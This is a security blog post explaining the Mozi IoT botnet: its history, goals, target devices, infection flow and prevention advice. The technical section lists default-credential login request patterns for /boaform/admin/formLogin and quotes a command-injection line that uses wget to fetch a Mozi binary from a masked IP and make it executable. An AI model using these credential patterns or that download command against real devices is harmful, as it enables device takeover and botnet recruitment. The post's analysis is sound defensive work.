<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="What is Mozi MalwareThe common defination is that Mozi is a IoT botnet, that makes use of P2P for communiacating and reuses source code of other well-known malware families, includingGafgyt, Mirai and">
<meta property="og:type" content="article">
<meta property="og:title" content="What is mozi malware and how it works?">
<meta property="og:url" content="https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/index.html">
<meta property="og:site_name" content="Cyber Security with R&amp;D perspective">
<meta property="og:description" content="What is Mozi MalwareThe common defination is that Mozi is a IoT botnet, that makes use of P2P for communiacating and reuses source code of other well-known malware families, includingGafgyt, Mirai and">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/Mozi-attack-flow.png">
<meta property="og:image" content="https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/mozi-architecture.png">
<meta property="article:published_time" content="2024-06-08T13:39:12.000Z">
<meta property="article:modified_time" content="2024-06-10T07:55:01.224Z">
<meta property="article:author" content="11E48B5">
<meta property="article:tag" content="malware">
<meta property="article:tag" content="mozi">
<meta property="article:tag" content="technical">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/Mozi-attack-flow.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>What is mozi malware and how it works?</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/hello-world/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&text=What is mozi malware and how it works?"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&title=What is mozi malware and how it works?"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&is_video=false&description=What is mozi malware and how it works?"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=What is mozi malware and how it works?&body=Check out this article: https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&title=What is mozi malware and how it works?"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&title=What is mozi malware and how it works?"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&title=What is mozi malware and how it works?"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&title=What is mozi malware and how it works?"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&name=What is mozi malware and how it works?&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&t=What is mozi malware and how it works?"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#What-is-Mozi-Malware"><span class="toc-number">1.</span> <span class="toc-text">What is Mozi Malware</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#History-of-Mozi"><span class="toc-number">1.1.</span> <span class="toc-text">History of Mozi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-Mozi-Malware-Works-Technical-Details"><span class="toc-number">1.2.</span> <span class="toc-text">How Mozi Malware Works? (Technical Details)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Technical-Mitigation-Strategies"><span class="toc-number">1.3.</span> <span class="toc-text">Technical Mitigation Strategies</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prevention"><span class="toc-number">1.3.1.</span> <span class="toc-text">Prevention</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        What is mozi malware and how it works?
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">11E48B5</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-06-08T13:39:12.000Z" class="dt-published" itemprop="datePublished">2024-06-08</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/malware/" rel="tag">malware</a>, <a class="p-category" href="/tags/mozi/" rel="tag">mozi</a>, <a class="p-category" href="/tags/technical/" rel="tag">technical</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="What-is-Mozi-Malware"><a href="#What-is-Mozi-Malware" class="headerlink" title="What is Mozi Malware"></a>What is Mozi Malware</h1><p>The common defination is that Mozi is a IoT botnet, that makes use of P2P for communiacating and reuses source code of other well-known malware families, including<br>Gafgyt, Mirai and IoT Reaper. The possible victims are that not configured IoT devices based on security perspective such as network gateways, digital video records (DVRs) and IP cameras. It works by exploiting <code>weak telnet passwords</code> and unpatched IoT <code>vulnerabilites</code>. After gaining access to the victim device, it tries to get Mozi malware from infected spreaders using <code>Wget</code> command. We’ll look at techinal details later. For now lets look at the history and capabilities of that shit Malware.</p>
<h2 id="History-of-Mozi"><a href="#History-of-Mozi" class="headerlink" title="History of Mozi"></a>History of Mozi</h2><p>First discovered <strong>in late 2019</strong>, Mozi has evolved significantly over time, demonstrating sophisticated capabilities and resilience. Mozi was initially identified by researchers from Netlab 360 in late 2019. It stood out due to its use of a Distributed Hash Table (DHT) for command-and-control (C2) communication, a technique borrowed from peer-to-peer (P2P) networks like BitTorrent. This approach allowed Mozi to maintain a decentralized infrastructure, making it difficult to disrupt. If we look at the purpose of this malware, we can simply list like this;</p>
<ul>
<li>Conduct DDoS attacks</li>
<li>Data exfiltration</li>
<li>Command or payload execution</li>
<li>MITM attacks via HTTP Hijacking and DNS spoofing</li>
<li>Stealing data</li>
</ul>
<p>As a nature of this malware, it aims to deliver itself to IoT devices that covers also routers and edge routers. When a router get infected, you can make any kind of network attacks. Because of that reason, it is very dangereous. Possible victim lists are;</p>
<ul>
<li>Consumer IoT: Home-based devices, such as security cameras, lighting control, appliances, etc.</li>
<li>Commercial IoT: Devices designed for use in various industries. For instance, healthcare has internet-connected pacemakers and monitors. The transportation and construction industries use devices associated with vehicle trackers, telematics, logistic and supply chain systems and building information modeling.</li>
<li>Enterprise IoT: Devices designed for use in offices, such as projectors, routers, security systems and digital advertising.</li>
<li>The Industrial IoT: Industrial control systems, production line automation systems, logic controllers and aircraft systems.</li>
<li>Infrastructure IoT: Smart city management systems, traffic control devices, utility monitoring devices, etc.</li>
<li>Internet of Military Things: Wearable combat biometrics devices, robots and surveillance equipment.</li>
<li>OT&#x2F;ICS infrastructure.</li>
</ul>
<p>Here is the killchain of <code>Mozi malware</code></p>
<img src="/what-is-mozi-malware-and-how-it-works/Mozi-attack-flow.png" class="">

<h2 id="How-Mozi-Malware-Works-Technical-Details"><a href="#How-Mozi-Malware-Works-Technical-Details" class="headerlink" title="How Mozi Malware Works? (Technical Details)"></a>How Mozi Malware Works? (Technical Details)</h2><p>What if we download mozi malware from urlhaus or threatfox, you can see the type of this malwares mostly <code>ELF 32-bit MSB executable, MIPS, MIPS-I version 1</code> or <code>ARM</code> version of this. They gets downloaded from random node who already infected in botnet network. One infected Mozi bot (maybe router or camera) scans the network to find possible victims by sending HTTP requests to comman urls that used from possible IoT devices. Maybe it searchs for vulnerabilities that gives power to comprimise the device. Patterns for HTTP request that made from Mozi bot are that;</p>
<ul>
<li>&#x2F;boaform&#x2F;admin&#x2F;formLogin?username&#x3D;user&amp;psd&#x3D;user</li>
<li>&#x2F;boaform&#x2F;admin&#x2F;formLogin?username&#x3D;admin&amp;psd&#x3D;admin</li>
<li>&#x2F;boaform&#x2F;admin&#x2F;formLogin?username&#x3D;adminisp&amp;psd&#x3D;adminisp</li>
<li>&#x2F;boaform&#x2F;admin&#x2F;formLogin?username&#x3D;ec8&amp;psd&#x3D;ec8</li>
</ul>
<p>If it can access possible victim using this credantials, it trys to download Mozi malware itself using <code>wget</code> command that is a powerful utility for non-interactive downloading of files from the web. The comman pattern to test victim is vulnerable for CMDi attacks for delivering malware is that <code>wget http://xxx.xx.xxx.xxx/bins/mozi.a -o /var/tmp/mozi.a; chmod 777 /var/tmp/mozi.a; rm -rf /var/tmp/mozi.a</code></p>
<p>After that malware gets downloaded and executed. Once executed, the <code>binary forks</code> many versions of itself renamed as ‘ssh’ or ‘dropbear’. The forked processes are responsible for setting up the DHT communications and closing ports to prevent infection by other malware. The forked processes can also set up HTTP on a randomly chosen port to host the Mozi binary.</p>
<img src="/what-is-mozi-malware-and-how-it-works/mozi-architecture.png" class="">

<h2 id="Technical-Mitigation-Strategies"><a href="#Technical-Mitigation-Strategies" class="headerlink" title="Technical Mitigation Strategies"></a>Technical Mitigation Strategies</h2><p>To effectively protect against <code>Mozi</code> malware, you can follow below advices. Here are detailed technical advices:</p>
<h3 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h3><ul>
<li>Strengthen Authentication:<ul>
<li>Enforce strong, unique passwords for all IoT devices. Avoid using default credentials.</li>
<li>Implement multi-factor authentication (MFA) where possible.</li>
</ul>
</li>
<li>Firmware and Software Updates:<ul>
<li>Regularly update firmware and software on all IoT devices to patch known vulnerabilities.</li>
<li>Enable automatic updates if the option is available.</li>
</ul>
</li>
<li>Network Segmentation:<ul>
<li>Isolate IoT devices from critical network segments to limit the impact of a potential compromise.</li>
<li>Use VLANs (Virtual Local Area Networks) and firewalls to control traffic between network segments.</li>
</ul>
</li>
<li>Disable Unnecessary Services:<ul>
<li>Turn off unused services and protocols on IoT devices to reduce attack surfaces.</li>
</ul>
</li>
</ul>
<p>See you in next blog.</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#What-is-Mozi-Malware"><span class="toc-number">1.</span> <span class="toc-text">What is Mozi Malware</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#History-of-Mozi"><span class="toc-number">1.1.</span> <span class="toc-text">History of Mozi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-Mozi-Malware-Works-Technical-Details"><span class="toc-number">1.2.</span> <span class="toc-text">How Mozi Malware Works? (Technical Details)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Technical-Mitigation-Strategies"><span class="toc-number">1.3.</span> <span class="toc-text">Technical Mitigation Strategies</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prevention"><span class="toc-number">1.3.1.</span> <span class="toc-text">Prevention</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&text=What is mozi malware and how it works?"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&title=What is mozi malware and how it works?"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&is_video=false&description=What is mozi malware and how it works?"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=What is mozi malware and how it works?&body=Check out this article: https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&title=What is mozi malware and how it works?"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&title=What is mozi malware and how it works?"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&title=What is mozi malware and how it works?"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&title=What is mozi malware and how it works?"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&name=What is mozi malware and how it works?&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0x11e48b5.github.io/what-is-mozi-malware-and-how-it-works/&t=What is mozi malware and how it works?"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    11E48B5
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
